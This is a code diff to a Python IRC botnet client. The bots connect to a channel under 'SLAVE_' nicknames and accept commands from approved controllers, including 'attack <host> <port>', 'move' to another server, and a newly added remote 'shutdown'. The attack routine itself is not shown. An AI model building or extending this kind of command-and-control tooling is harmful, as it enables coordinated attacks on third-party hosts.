@@ -15,7 +15,7 @@ class Bot:
         self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         # BOT INFO
-        self.botNick = "HELLO PAUL WASSUP " + str(random.randrange(10000))
+        self.botNick = "SLAVE_" + str(random.randrange(10000))
         self.liveConnection = False # Flag to see if controller connection to IRC Server is active
         self.command = None
         self.attackCount = 0
@@ -62,27 +62,6 @@ class Bot:
     def privateMsg(self, receiver, msg):
         self.sendData("PRIVMSG {} :{}\n" .format(receiver, msg))
 
-    # Send to Channel
-    # Receiver should be CHANNEL
-    def sendMsg(self, receiver, msg):
-        self.sendData("PRIVMSG {} :{}\n" .format(receiver, msg))
-    
-    # Msg parser 
-    def parseMsg(self, msg):
-        prefix = ''
-        trailing = []        
-        if not msg:
-            raise IRCBadMessage("Empty line.")
-        if msg[0] == ':':            
-            prefix, msg = msg[1:].split(' ', 1)
-        if msg.find(' :') != -1:
-            msg, trailing = msg.split(' :', 1)
-            args = msg.split()
-            args.append(trailing)
-        else:
-            args = msg.split()
-        command = args.pop(0)
-        return prefix, command, args
 
     # Gets response 
     def handleResponse(self, prefix, message):
@@ -91,8 +70,8 @@ class Bot:
         if prefix in self.acceptedCons:
             print("from " + prefix + " to do " + message)
             if message == "status":
-                print("sending back status")
-                self.privateMsg(prefix, "!STATUS! " + self.botNick)
+                #print("sending back status")
+                self.privateMsg(prefix, "Correct pass - " + self.botNick)
             elif message.startswith("attack"):
                 if len(message.split()) == 3:
                     hostTarget = message.split()[1]
@@ -108,6 +87,11 @@ class Bot:
                     self.botMove(newHost, newPort, newChannel)
                 else:
                     print("Incorrect usage of command: move <host-name> <port> <channel>")
+            elif message == "shutdown":
+                #print("shutting down")
+                self.privateMsg(prefix, "Shutdown successful - " + self.botNick)
+                self.IRCSOCKET.close()
+                sys.exit(0)
             
 
     # BOT COMMAND FUNCTIONS HERE ---------------------------------------------------------------------------------------------
@@ -205,6 +189,14 @@ class Bot:
                 self.privateMsg(x, "Unable to move to new server. Bot still in old channel")
             return False 
         
+    def changeNick(self):
+        oldName = self.botNick 
+        self.botNick = "SLAVE_" + str(random.randrange(10000))
+        self.IRCconnect(self.CHANNEL)
+        for x in self.acceptedCons:
+            self.privateMsg(x, oldName + " has been renamed to " + self.botNick + " due to existing name in channel. Attempting to reconnect")
+        return
+
     # Read
     def reader(self):
         try:
@@ -218,16 +210,12 @@ class Bot:
                             print("message from " + name + ": " + message)   
                             self.handleResponse(name, message)                               
                         elif response.find("PING") != -1:
-                            self.sendData("PONG {}: :\r\n".format(self.HOST).encode("utf-8"))                                                                          
+                            self.sendData("PONG {}: :\r\n".format(self.HOST))                                                                         
                         elif response.find('433') != -1:
                             #self.createNick(self.NICK)
                             #self.connectIRC(self.s,self.NICK, self.chan)  
                             # Use this to make new nickname if needed
-                            oldName = self.botNick 
-                            self.botNick = "SLAVE" + str(random.randrange(10000))
-                            self.IRCconnect(self.CHANNEL)
-                            for x in self.acceptedCons:
-                                self.privateMsg(x, oldName + " has been renamed to " + self.botNick + " due to existing name in channel. Attempting to reconnect")
+                            self.changeNick()
                             pass
         except Exception as e:
             print("Exception: ")
@@ -272,6 +260,8 @@ def main():
         print("connecting")
         while noConnection:
             noConnection = bot.IRCconnect(CHANNEL)
+            if not noConnection:
+                bot.changeNick()
         
         print("Controller is running. Connected with nick: " + bot.botNick)
 
